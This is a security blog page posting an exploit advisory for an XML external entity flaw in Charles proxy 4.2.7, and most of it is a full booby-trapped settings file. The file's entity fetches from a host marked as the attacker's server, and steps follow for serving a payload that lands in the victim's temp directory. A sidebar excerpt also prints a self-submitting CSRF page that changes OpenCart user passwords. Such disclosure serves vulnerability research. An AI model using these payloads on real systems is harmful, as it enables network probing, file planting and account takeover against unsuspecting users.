=== Content from whitehatck01.blogspot.com_bb16fb49_20250124_210519.html ===

[跳至主要内容](#main)

### 搜索此博客

# [CK01](https://whitehatck01.blogspot.com/)

### Charles 4.2.7 XML External Entity

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[十一月 12, 2018](https://whitehatck01.blogspot.com/2018/11/charles-427-xml-external-entity.html "permanent link")

Software Link:[https://www.charlesproxy.com](https://www.charlesproxy.com/)

Date:11.12.2018

Exploit Author:CK01

Version:<=4.2.7

```
Security Issue:
```
```

```
```
The XML External Entity vulnerability exists in the Charles import/export setup option. If the user imports the "Charles Settings.xml" of the attacker, the internal network may be detected and the information may be leaked.
```
```

```
```

```
```
POC:
```
```

```
```
1.Charles Setting.xml:(127.0.0.1 -> attacker's server )
```
```

```
```
<?xml version='1.0' encoding='UTF-8' ?>
<?charles serialisation-version='2.0' ?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "jar:http://127.0.0.1:2014/!/">]>
<charles-export>
  <proxyConfiguration>
    <enableSOCKSProxy>false</enableSOCKSProxy>
    <dynamicHTTPPort>false</dynamicHTTPPort>
    <dynamicSOCKSPort>false</dynamicSOCKSPort>
    <enableSOCKSTransparentHTTPProxying>true</enableSOCKSTransparentHTTPProxying>
    <port>8888</port>
    <SOCKSPort>8889</SOCKSPort>
    <decryptSSL>true</decryptSSL>
    <transparentProxy>false</transparentProxy>
    <preferIPv6addresses>false</preferIPv6addresses>
    <sslLocations>
      <locationPatterns>
        <locationMatch>
          <location>
            <host>*</host>
            <port>443</port>
          </location>
          <enabled>true</enabled>
        </locationMatch>
      </locationPatterns>
    </sslLocations>
    <defaultSOCKSTransparentHTTPProxyPorts>true</defaultSOCKSTransparentHTTPProxyPorts>
    <socksTransparentHTTPProxyPorts/>
    <socksTransparentHTTPProxyPortRanges/>
    <windowsConfiguration>
      <useHTTP>true</useHTTP>
      <useSOCKS>false</useSOCKS>
      <enableAtStartup>true</enableAtStartup>
    </windowsConfiguration>
    <macOSXConfiguration>
      <useHTTP>true</useHTTP>
      <useSOCKS>false</useSOCKS>
      <enableAtStartup>false</enableAtStartup>
    </macOSXConfiguration>
    <mozillaFirefoxConfiguration>
      <useHTTP>true</useHTTP>
      <useSOCKS>false</useSOCKS>
      <enableAtStartup>true</enableAtStartup>
    </mozillaFirefoxConfiguration>
  </proxyConfiguration>
  <recordingConfiguration>
    <limit>100</limit>
    <maxTransactions>0</maxTransactions>
    <maxWebSocketMessages>-1</maxWebSocketMessages>
    <ignoreHosts>
      <locationPatterns/>
    </ignoreHosts>
    <recordHosts>
      <locationPatterns/>
    </recordHosts>
  </recordingConfiguration>
  <accessControlConfiguration>
    <warn>true</warn>
    <ipRanges>
      <ipRange>
        <ip>
          <int>192</int>
          <int>168</int>
          <int>2</int>
          <int>43</int>
        </ip>
        <mask>
          <int>255</int>
          <int>255</int>
          <int>255</int>
          <int>255</int>
        </mask>
      </ipRange>
    </ipRanges>
  </accessControlConfiguration>
  <externalProxyConfiguration>
    <configurations>
      <entry>
        <string>socks</string>
        <mutableExternalProxyConfiguration>
          <active>false</active>
          <requiresAuthentication>false</requiresAuthentication>
          <port>0</port>
        </mutableExternalProxyConfiguration>
      </entry>
      <entry>
        <string>http</string>
        <mutableExternalProxyConfiguration>
          <active>true</active>
          <requiresAuthentication>false</requiresAuthentication>
          <host>127.0.0.1</host>
          <port>1087</port>
          <domain></domain>
          <username></username>
          <encryptedPassword>2aQ4yHV+W99fhLcoM+aSlQ==</encryptedPassword>
        </mutableExternalProxyConfiguration>
      </entry>
      <entry>
        <string>https</string>
        <mutableExternalProxyConfiguration>
          <active>true</active>
          <requiresAuthentication>false</requiresAuthentication>
          <host>127.0.0.1</host>
          <port>1087</port>
          <domain></domain>
          <username></username>
          <encryptedPassword>X7aDnIieHyR9nVYpOPBpBw==</encryptedPassword>
        </mutableExternalProxyConfiguration>
      </entry>
    </configurations>
    <enabled>true</enabled>
    <alwaysBypassLocalhost>true</alwaysBypassLocalhost>
  </externalProxyConfiguration>
  <throttlingConfiguration>
    <bandwidthDown>57.6</bandwidthDown>
    <bandwidthUp>33.6</bandwidthUp>
    <utilisationDown>70</utilisationDown>
    <utilisationUp>70</utilisationUp>
    <latency>250</latency>
    <reliability>100</reliability>
    <mtu>576</mtu>
    <lowQuality>100</lowQuality>
    <highQuality>100</highQuality>
    <stability>100</stability>
    <customPresets/>
    <hosts class="listAdapter">
      <list/>
    </hosts>
    <selectedHosts>false</selectedHosts>
  </throttlingConfiguration>
  <startupConfiguration>
    <newSession>true</newSession>
    <throttling>false</throttling>
    <checkUpdates>true</checkUpdates>
    <maximised>false</maximised>
    <fullscreen>false</fullscreen>
    <mainWindow>
      <x>171</x>
      <y>64</y>
      <width>1231</width>
      <height>770</height>
    </mainWindow>
    <currentDirectory>&file;</currentDirectory>
    <lastCheckUpdates>2018-11-12 07:40:37.437 UTC</lastCheckUpdates>
  </startupConfiguration>
  <userInterfaceConfiguration>
    <promptToSaveSessions>false</promptToSaveSessions>
    <promptToClearSession>false</promptToClearSession>
    <showLineNumbers>true</showLineNumbers>
    <lineWrap>true</lineWrap>
    <autoScroll>true</autoScroll>
    <combineHeadersAndBody>true</combineHeadersAndBody>
    <combineRequestAndResponse>true</combineRequestAndResponse>
    <minimiseToTray>false</minimiseToTray>
    <showMemoryUsage>false</showMemoryUsage>
    <enableHotkeys>true</enableHotkeys>
    <alwaysOnTop>false</alwaysOnTop>
    <showTrayIcon>true</showTrayIcon>
    <highlightTreeChanges>true</highlightTreeChanges>
    <sequenceFocused>false</sequenceFocused>
    <sessionNavStructureLayout>0</sessionNavStructureLayout>
    <sessionNavSequenceLayout>1</sessionNavSequenceLayout>
    <unitsSpeed>0</unitsSpeed>
    <unitsTime>0</unitsTime>
    <warningsSeen/>
    <properties>
      <entry>
        <string>SessionFrame.splitPlane.dividerLocation.horizontal</string>
        <int>300</int>
      </entry>
      <entry>
        <string>RequestResponsePanel.DIVIDER_LOCATON</string>
        <int>289</int>
      </entry>
      <entry>
        <string>SummaryPanel.TABLE_COLUMN_STATES</string>
        <columnStates/>
      </entry>
      <entry>
        <string>ChartPanel.SIZE_TABLE_COLUMN_STATES</string>
        <columnStates/>
      </entry>
      <entry>
        <string>ChartPanel.TIMELINE_TABLE_COLUMN_STATES</string>
        <columnStates/>
      </entry>
      <entry>
        <string>ChartPanel.DURATION_TABLE_COLUMN_STATES</string>
        <columnStates/>
      </entry>
      <entry>
        <string>SessionFrame.splitPlane.dividerLocation.vertical</string>
        <int>200</int>
      </entry>
      <entry>
        <string>SessionFrame.navTabs.mode</string>
        <string>Structure</string>
      </entry>
      <entry>
        <string>URLEncodedQueryViewer.TABLE_COLUMN_STATES</string>
        <columnStates/>
      </entry>
      <entry>
        <string>NavigatorJTable.TABLE_COLUMN_STATES</string>
        <columnStates/>
      </entry>
      <entry>
        <string>ChartPanel.TYPE_TABLE_COLUMN_STATES</string>
        <columnStates/>
      </entry>
    </properties>
  </userInterfaceConfiguration>
  <toolConfiguration>
    <configs>
      <entry>
        <string>Breakpoints</string>
        <breakpoints>
          <toolEnabled>false</toolEnabled>
          <breakpoints/>
        </breakpoints>
      </entry>
      <entry>
        <string>Reverse Proxies</string>
        <reverseProxies>
          <active>false</active>
          <reverseProxies/>
        </reverseProxies>
      </entry>
      <entry>
        <string>White List</string>
        <whitelist>
          <locations>
            <locationPatterns/>
          </locations>
          <toolEnabled>false</toolEnabled>
          <useSelectedLocations>false</useSelectedLocations>
          <action>0</action>
        </whitelist>
      </entry>
      <entry>
        <string>Map Remote</string>
        <map>
          <toolEnabled>false</toolEnabled>
          <mappings/>
        </map>
      </entry>
      <entry>
        <string>Port Forwarding</string>
        <portForwarding>
          <active>false</active>
          <portForwardings/>
        </portForwarding>
      </entry>
      <entry>
        <string>Viewer Mappings</string>
        <viewerMappings>
          <toolEnabled>false</toolEnabled>
          <mappings/>
        </viewerMappings>
      </entry>
      <entry>
        <string>Rewrite</string>
        <rewrite>
          <toolEnabled>false</toolEnabled>
          <debugging>false</debugging>
          <sets/>
        </rewrite>
      </entry>
      <entry>
        <string>Map Local</string>
        <mapLocal>
          <toolEnabled>false</toolEnabled>
          <mappings/>
        </mapLocal>
      </entry>
      <entry>
        <string>Black List</string>
        <blacklist>
          <locations>
            <locationPatterns/>
          </locations>
          <toolEnabled>false</toolEnabled>
          <useSelectedLocations>false</useSelectedLocations>
          <action>0</action>
        </blacklist>
      </entry>
      <entry>
        <string>Client Process</string>
        <selectedHostsTool>
          <locations>
            <locationPatterns/>
          </locations>
          <toolEnabled>false</toolEnabled>
          <useSelectedLocations>false</useSelectedLocations>
        </selectedHostsTool>
      </entry>
      <entry>
        <string>No Caching</string>
        <selectedHostsTool>
          <locations>
            <locationPatterns/>
          </locations>
          <toolEnabled>false</toolEnabled>
          <useSelectedLocations>false</useSelectedLocations>
        </selectedHostsTool>
      </entry>
      <entry>
        <string>DNS Spoofing</string>
        <dnsSpoofing>
          <toolEnabled>false</toolEnabled>
          <spoofs/>
        </dnsSpoofing>
      </entry>
      <entry>
        <string>Mirror</string>
        <mirror>
          <locations>
            <locationPatterns/>
          </locations>
          <toolEnabled>false</toolEnabled>
          <useSelectedLocations>false</useSelectedLocations>
        </mirror>
      </entry>
      <entry>
        <string>Auto Save</string>
        <autoSave>
          <toolEnabled>false</toolEnabled>
          <enableOnStartup>false</enableOnStartup>
          <saveLowMem>false</saveLowMem>
          <startOnMultiple>false</startOnMultiple>
          <savePeriod>0</savePeriod>
        </autoSave>
      </entry>
      <entry>
        <string>Block Cookies</string>
        <selectedHostsTool>
          <locations>
            <locationPatterns/>
          </locations>
          <toolEnabled>false</toolEnabled>
          <useSelectedLocations>false</useSelectedLocations>
        </selectedHostsTool>
      </entry>
    </configs>
  </toolConfiguration>
  <remoteControlConfiguration>
    <enabled>false</enabled>
    <allowAnonymous>false</allowAnonymous>
    <users/>
  </remoteControlConfiguration>
  <clientSSLCertificatesConfiguration>
    <certificates/>
  </clientSSLCertificatesConfiguration>
  <protobufConfiguration>
    <hideUnvaluedFields>true</hideUnvaluedFields>
    <cacheDescriptors>true</cacheDescriptors>
    <heuristicTTL>300000</heuristicTTL>
    <descriptors/>
  </protobufConfiguration>
  <gistConfiguration>
    <publishLimit>10</publishLimit>
    <secret>true</secret>
    <openGist>true</openGist>
    <enterpriseGitHub>false</enterpriseGitHub>
  </gistConfiguration>
  <focusConfiguration>
    <hosts>
      <locationPatterns/>
    </hosts>
  </focusConfiguration>
</charles-export>
```
```

```
```
2.The attacker executes on the server: java BlockingServer 2014 xxe.txt
```
```
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS4ZrxYvAS_r0S6gEMnOni_k2S2MLOtZJODvfeyPoaD3S_vtvoiCzB99lYHEsJ74xKYBvq3tCWNTYkke5brewnkTwgtEkuL8VULSVUXNs1bzZhyphenhypheng132X6tMD0OH-6h6C98WfmPxxL48iJH/s400/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7+2018-11-12+%25E4%25B8%258B%25E5%258D%258811.33.56.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS4ZrxYvAS_r0S6gEMnOni_k2S2MLOtZJODvfeyPoaD3S_vtvoiCzB99lYHEsJ74xKYBvq3tCWNTYkke5brewnkTwgtEkuL8VULSVUXNs1bzZhyphenhypheng132X6tMD0OH-6h6C98WfmPxxL48iJH/s1600/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2018-11-12%2B%25E4%25B8%258B%25E5%258D%258811.33.56.png)
```
```

```
```
3.xxe.txt on the attacker's server
```
```

```
```
  This file comes from the attacker server！
```
```

```
```
4.The victim temporary directory will generate the jar_cachexxxxxxxxxxxxx.tmp file with the content: "This file comes from the attacker server！"
```
```

```
```
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYIezvIKUiLvpfivEhiVOdbFFTnZceMOo8mzM7aXfNhpK1n4Fa9Gq6ib04C3AJas_wJURrvziiWd6DYGRFqDxz62EqmivYyfQWpbwBm_TE64PSwgQPbJk7cyHeRA8Q8ZwNdHUgaMdLFZQT/s400/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7+2018-11-12+%25E4%25B8%258B%25E5%258D%258811.39.37.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYIezvIKUiLvpfivEhiVOdbFFTnZceMOo8mzM7aXfNhpK1n4Fa9Gq6ib04C3AJas_wJURrvziiWd6DYGRFqDxz62EqmivYyfQWpbwBm_TE64PSwgQPbJk7cyHeRA8Q8ZwNdHUgaMdLFZQT/s1600/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2018-11-12%2B%25E4%25B8%258B%25E5%258D%258811.39.37.png)
```
```

```
```

```
```
reference:
```
```
<http://www.pwntester.com/blog/2013/11/28/abusing-jar-downloads/>
```
```
<https://github.com/pwntester/BlockingServer>
```
```
<https://www.youtube.com/watch?v=eHSNT8vWLfc&feature=youtu.be>
```
```

```

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

### 评论

#### 发表评论

### 此博客中的热门博文

### [Opencart-v3-0-3-0 user changes password at csrf vulnerability](https://whitehatck01.blogspot.com/2018/06/opencart-v3-0-3-0-user-changes-password.html)

[六月 28, 2018](https://whitehatck01.blogspot.com/2018/06/opencart-v3-0-3-0-user-changes-password.html "permanent link")

[![图片](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixrVk13oa3RlbW_2_Svayhgb9_TYddC8c0rE_BIXmgybREVXTia-iNlV7w8jq0hKS0DZRWWat4eAlapAD3m_BVMZ0agEXP6uohFMr2_HdVMAIYZ-FcJsMxGnK7QGdXwMh9W3ooxSZYVWDp/s400/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7+2018-06-28+%25E4%25B8%258B%25E5%258D%25886.27.00.png)](https://whitehatck01.blogspot.com/2018/06/opencart-v3-0-3-0-user-changes-password.html)

Software Link: https://github.com/opencart/opencart/ Date: 06.28.2018 Exploit Author:CK01 Version:<= V3-0-3-0 0x00 Vulnerability analysis       The user token was not verified at the password change, causing the csrf vulnerability to modify the user password  /upload/catalog/controller/account/password.php 0x01 Exploit Save the following exp as html and open the run <html>   <body>     <form id="post123" name="post123" action="http://192.168.0.46/opencart/index.php?route=account/password&language=en-gb" method="POST" enctype="multipart/form-data">   <input type="hidden" name="password" value="CK01ck01" />       <input type="hidden" name="confirm" value="CK01ck01" /> <script>         document.getElementById('post123').submit();  </script>     </form>   </body> </html>...

[阅读全文](https://whitehatck01.blogspot.com/2018/06/opencart-v3-0-3-0-user-changes-password.html "Opencart-v3-0-3-0 user changes password at csrf vulnerability")

### [Docker's latest version of privilege escalation vulnerability](https://whitehatck01.blogspot.com/2020/06/dockers-latest-version-of-privilege.html)

[六月 26, 2020](https://whitehatck01.blogspot.com/2020/06/dockers-latest-version-of-privilege.html "permanent link")

[![图片](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIi7p5X946Lyn85-JHUTFdTgtX4kGvZhNeYVERFX0hLYP8UjntXGObrlJSk3ChyphenhyphenbwLRbEpvVPDz7jke1_tNUzy4AFM73uThiDiUo_Xj2eUwm6DB5pVCTc296BY6njQ6hzCjt0AJjbn81IM/s640/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7+2020-06-26+%25E4%25B8%258B%25E5%258D%25885.56.11.png)](https://whitehatck01.blogspot.com/2020/06/dockers-latest-version-of-privilege.html)

0x00 Vulnerability analysis 1.com.docker.vmnetd is a launch service that runs at root authority; communicates with the client (Docker) through a local socket; after analysis, it is found that the client is not verified during the communication process, resulting in the risk of elevated permissions 2. The two main functions in main\_handle are vmnet\_handshake\_Perform and vmnetd\_commands\_Handle; vmnet\_handshake\_Perform function mainly initializes the message and obtains the corresponding client command. vmnetd\_commands\_Handle function calls the corresponding callback function according to the obtained command 2.1 vmnet\_handshake\_Perform 2.1.1 First obtain the initialization message (3 packets) requested by the client through vmnet\_handshake\_readInitMessage. The message structure is as follows packet-1: flag c00009a318  56 4d 4e 33 54 00 00 00 00 00 00 00 00 00 00 00  VMN3T........... c00009a328  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ...

[阅读全文](https://whitehatck01.blogspot.com/2020/06/dockers-latest-version-of-privilege.html "Docker's latest version of privilege escalation vulnerability ")

[由 Blogger 提供支持](https://www.blogger.com)

主题背景图片创建者：[Michael Elkan](http://www.offset.com/photos/394244)

[![我的照片](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhz5jBHJDcXyjCH8gImltGa29K3K3RLV0HYTamhmXsMpdfdE390itUeUsBXU7WmqonLxzStGa9cjlf_7Fgx83WaThKEqgShWAeMNP7bwpTkyDxBQhCE4gTbYo7tX0F-wQ/s113/QQ20170914-0.gif)](https://www.blogger.com/profile/08262058848640871089)
[CK01](https://www.blogger.com/profile/08262058848640871089)

Security researcher || Exploit || Vulnerability mining(Microsoft,Adobe,Apple,VirtualBox,VMware, etc)

[访问个人资料](https://www.blogger.com/profile/08262058848640871089)

### 归档

* [六月 20201](https://whitehatck01.blogspot.com/2020/06/)
* [十一月 20181](https://whitehatck01.blogspot.com/2018/11/)
* [六月 20181](https://whitehatck01.blogspot.com/2018/06/)
* [四月 20185](https://whitehatck01.blogspot.com/2018/04/)
* [三月 20182](https://whitehatck01.blogspot.com/2018/03/)
* [二月 20184](https://whitehatck01.blogspot.com/2018/02/)

### 标签

* [漏洞分析](https://whitehatck01.blogspot.com/search/label/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)
* [漏洞挖掘](https://whitehatck01.blogspot.com/search/label/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98)
* [内核](https://whitehatck01.blogspot.com/search/label/%E5%86%85%E6%A0%B8)
* [web](https://whitehatck01.blogspot.com/search/label/web)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)


